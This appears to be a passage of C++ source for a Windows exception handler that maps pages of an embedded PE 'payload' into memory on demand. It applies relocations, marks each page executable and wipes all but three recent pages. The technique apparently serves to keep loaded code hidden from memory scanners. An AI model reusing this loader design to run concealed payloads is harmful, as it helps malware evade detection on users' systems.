		else if (smallList.size() >= 3) { 
			auto it = smallList.begin();
			Page tmp = *it;
			DWORD old;
			os << std::hex << "Fault clearing " << std::setw(16) << std::setfill('0') << tmp.pageAdress << '\n';
			
			if (VirtualProtect(tmp.pageAdress, tmp.pageSize, PAGE_READWRITE, &old)) {
			memset(tmp.pageAdress, 0, tmp.pageSize);
			VirtualProtect(tmp.pageAdress, tmp.pageSize, PAGE_NOACCESS, &old);
			smallList.pop_front();
			//memset((BYTE*)ImageBase + (ULONG_PTR)faultAddr, 0, tmp.pageSize);
			}

			//smallList.pop_front();
			smallList.emplace_back((LPVOID)pageStart, PAGE_SIZE);
		}
	
/*
    else if (smallList.size() >= 3) { 
    		Page tmp = smallList.front();
    		os << std::hex << "Fault clearing " << std::setw(16) << std::setfill('0') << tmp.pageAdress << '\n';

   			 DWORD oldProtect;

	if (VirtualProtect(tmp.pageAdress, tmp.pageSize, PAGE_READWRITE, &oldProtect)) {
			//printf("1\n");
        	memset(tmp.pageAdress, 0, tmp.pageSize);
			os << std::hex << "true fault clearing " << std::setw(16) << std::setfill('0') << tmp.pageAdress << '\n';

       		VirtualProtect(tmp.pageAdress, tmp.pageSize, PAGE_NOACCESS, &oldProtect);
    }

    smallList.pop_front();
}
*/


		/*if (pageStart != lastpageadress) {
			memset((BYTE*)ImageBase + lastpageadress, 0, lastpagesize);
			os << std::hex << std::setw(16) << std::setfill('0') << lastpageadress << " has been nulled!\n";
			lastpageadress = pageStart - (ULONG_PTR)ImageBase;
		}*/

		//VirtualAlloc((LPVOID)pageStart, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE);

		DWORD offset = (DWORD)(pageStart - start);
		DWORD fileOffset = SC_Header[i].PointerToRawData + offset;
        LPVOID pointer = finalPayload + fileOffset;

		DWORD rva = faultAddr - (ULONG_PTR)OPT_Header.ImageBase;
		os << std::hex << "rva of copy data " << std::setw(16) << std::setfill('0') << rva << "\n"; 

		os << std::hex << "file offset here! " << std::setw(16) << std::setfill('0') << fileOffset << "\n";

		os << std::hex << "Writing data for" << std::setw(16) << std::setfill('0') << faultAddr << "\n";
		//printf("Writing data for %p\n", faultAddr);
		VirtualProtect((LPVOID)pageStart, PAGE_SIZE, PAGE_READWRITE, &old);
		
		//os << std::hex << "FSeek for " << std::setw(16) << std::setfill('0') << faultAddr << "\n";
		//printf("FSeek for %p\n", faultAddr);
		memcpy((LPVOID)pageStart, pointer, PAGE_SIZE);
		os << std::hex << "memory copied for " << std::setw(16) << std::setfill('0') << faultAddr << "!\n";
			//printf("fread() for %p returned %d/%d\n", faultAddr, result, PAGE_SIZE);
		
			//printf("everything is done for %p\n", faultAddr);

		

		//APPLY RELOCS FOR PAGE HERE
		if (doRelocsForPage(&OPT_Header, ImageBase, pageStart)) {
			os << std::hex << "Relocations done for " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
			//printf("Relocations done for %p!\n", faultAddr);
		}
		//APPLY RELOCS FOR PAGE HERE
		VirtualProtect((LPVOID)pageStart, PAGE_SIZE, PAGE_EXECUTE_READ, &old);
		os << std::hex << "Virtual Protect is set to PAGE_EXECUTE_READ, retrying for " << std::setw(16) << std::setfill('0') << faultAddr << '\n'; 
		//printf("Virtual Protect is set to PAGE_EXECUTE_READ, retrying for %p!\n", faultAddr);
		//FlushInstructionCache(GetCurrentProcess(), (LPVOID)pageStart, PAGE_SIZE);
		return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
  }
  return EXCEPTION_CONTINUE_SEARCH;
}
